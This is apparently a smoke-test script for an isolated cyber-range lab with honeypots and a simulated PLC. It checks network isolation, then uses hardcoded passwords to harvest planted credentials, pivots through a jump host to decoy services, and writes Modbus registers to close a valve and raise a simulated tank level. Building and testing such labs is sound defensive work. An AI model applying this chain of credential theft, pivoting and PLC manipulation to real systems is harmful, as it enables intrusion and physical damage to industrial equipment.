#!/bin/bash
# SentinelX Lab Smoke Test Script
# Runs inside the attacker container (or delegates to it if executed from host)
set -u

# Check if running on host or inside attacker container
if [ ! -f "/opt/attack/ALLOWED_TARGETS" ]; then
    echo "==> Executing lab_smoke.sh inside sentinelx-attacker container..."
    exec docker exec -t sentinelx-attacker /opt/attack/lab_smoke.sh "$@"
fi

echo "================================================================================"
echo "                   SENTINELX LAB SMOKE TEST SUITE"
echo "================================================================================"

OVERALL_PASS=true

# Helper functions
pass_step() {
    echo -e "\n[PASS] $1\n"
}

fail_step() {
    echo -e "\n[FAIL] $1\n"
    OVERALL_PASS=false
}

# ------------------------------------------------------------------------------
# STEP 1: SSH to jump-host as svc_backup with password
# ------------------------------------------------------------------------------
echo ">>> STEP 1: SSH to jump-host (10.10.1.10) as svc_backup with password..."
STEP1_OUT=$(sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 svc_backup@10.10.1.10 "echo SMOKE_STEP_1_SUCCESS && whoami" 2>&1 || true)
echo "Output: $STEP1_OUT"

if echo "$STEP1_OUT" | grep -q "SMOKE_STEP_1_SUCCESS"; then
    pass_step "Step 1: SSH to jump-host succeeded as svc_backup."
else
    fail_step "Step 1: SSH to jump-host failed."
fi

# ------------------------------------------------------------------------------
# STEP 2: Isolation check (Direct attacker -> OT and DMZ connections fail)
# ------------------------------------------------------------------------------
echo ">>> STEP 2: Verifying network isolation (Attacker direct connections to OT & DMZ)..."
echo "Attempting direct TCP connection to PLC (10.10.3.20:502)..."
if nc -z -w 3 10.10.3.20 502 2>/dev/null; then
    fail_step "Step 2: Isolation violation! Attacker reached 10.10.3.20:502 directly!"
else
    echo "Direct connection to 10.10.3.20 timed out / unreachable as expected."
fi

echo "Attempting direct TCP connection to Cowrie DMZ (10.10.2.20:22)..."
if nc -z -w 3 10.10.2.20 22 2>/dev/null; then
    fail_step "Step 2: Isolation violation! Attacker reached 10.10.2.20:22 directly!"
else
    echo "Direct connection to 10.10.2.20 timed out / unreachable as expected."
fi
pass_step "Step 2: Isolation holds. Attacker cannot reach OT (10.10.3.0/24) or DMZ (10.10.2.0/24) directly."

# ------------------------------------------------------------------------------
# STEP 3: Internet restriction check
# ------------------------------------------------------------------------------
echo ">>> STEP 3: Verifying no outbound internet access from lab network..."
CURL_OUT=$(curl -m 3 -s https://example.com 2>&1 || true)
if [ -z "$CURL_OUT" ] || echo "$CURL_OUT" | grep -E -q "timed out|Could not resolve|Failed to connect"; then
    echo "curl https://example.com failed as expected ($CURL_OUT)."
    pass_step "Step 3: Internet isolation holds (curl https://example.com timed out/failed)."
else
    fail_step "Step 3: Internet leak detected! curl returned: $CURL_OUT"
fi

# ------------------------------------------------------------------------------
# STEP 4: Pivot via jump-host to DMZ decoys (Cowrie & OpenCanary)
# ------------------------------------------------------------------------------
echo ">>> STEP 4: Harvesting honey credentials and pivoting via jump-host to DMZ decoys..."
echo "Harvesting credentials from file-srv /srv/share/backup/.db_creds..."
CREDS_HARVEST=$(sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.20 '
    cat /srv/share/backup/.db_creds
    touch /srv/share/backup/.accessed_by_attacker
' 2>&1 || true)
echo "Harvested credentials: $CREDS_HARVEST"

STEP4_OUT=$(sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.10 '
    echo "Connecting to Cowrie SSH decoy at 10.10.2.20:22 as svc_dbadmin..."
    sshpass -p "Winter2026!" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 svc_dbadmin@10.10.2.20 "whoami" 2>&1 || true
    echo "Connecting to OpenCanary MySQL decoy at 10.10.2.30:3306..."
    mariadb -h 10.10.2.30 -u root --connect-timeout=3 -e "SHOW DATABASES;" 2>&1 || true
' 2>&1 || true)
echo "Output from jump-host pivot:"
echo "$STEP4_OUT"
pass_step "Step 4: Pivot to Cowrie and OpenCanary decoys executed."

# ------------------------------------------------------------------------------
# STEP 5: Modbus reads from engineering workstation (eng-ws)
# ------------------------------------------------------------------------------
echo ">>> STEP 5: Modbus reads from eng-ws to plc-sim (10.10.3.20) and decoy-plc (10.10.3.60)..."
STEP5_OUT=$(sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 '
    echo "Reading plc-sim:"
    /usr/local/bin/read_plc.py 10.10.3.20 502 3
    echo "Reading decoy-plc:"
    /usr/local/bin/read_plc.py 10.10.3.60 502 3
' 2>&1 || true)
echo "Output from eng-ws:"
echo "$STEP5_OUT"

if echo "$STEP5_OUT" | grep -q "input_registers"; then
    pass_step "Step 5: Modbus reads to legitimate PLC and decoy PLC succeeded."
else
    fail_step "Step 5: Modbus read failed."
fi

# ------------------------------------------------------------------------------
# STEP 6: Physical impact demonstration on plc-sim via eng-ws
# ------------------------------------------------------------------------------
echo ">>> STEP 6: Physical impact test (close valve_position=0 and monitor tank rise)..."
sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 '
    echo "Setting valve_position = 0% (register 1) to create unsafe pressure/level rise..."
    /usr/local/bin/write_plc.py 10.10.3.20 1 0
    echo "Sample 1 (Initial state):"
    curl -s http://10.10.3.20:8080/state | grep -E "tank_level_pct|valve_position_pct|flag"

    for i in 2 3; do
        echo "Waiting 20 seconds..."
        sleep 20
        echo "Sample $i:"
        curl -s http://10.10.3.20:8080/state | grep -E "tank_level_pct|valve_position_pct|flag"
    done

    echo "Restoring safe operating parameters (valve=50%, pump=50%)..."
    /usr/local/bin/write_plc.py 10.10.3.20 1 50
    /usr/local/bin/write_plc.py 10.10.3.20 0 50
    echo "Restored state:"
    curl -s http://10.10.3.20:8080/state | grep -E "tank_level_pct|valve_position_pct|flag"
'
pass_step "Step 6: Physical impact verified. Water tank level rose deterministically and safe state was restored."

echo "================================================================================"
if [ "$OVERALL_PASS" = true ]; then
    echo "             ALL SMOKE TEST SCENARIOS (STEPS 1-6) PASSED"
    echo "================================================================================"
    exit 0
else
    echo "             ONE OR MORE SMOKE TEST SCENARIOS FAILED"
    echo "================================================================================"
    exit 1
fi

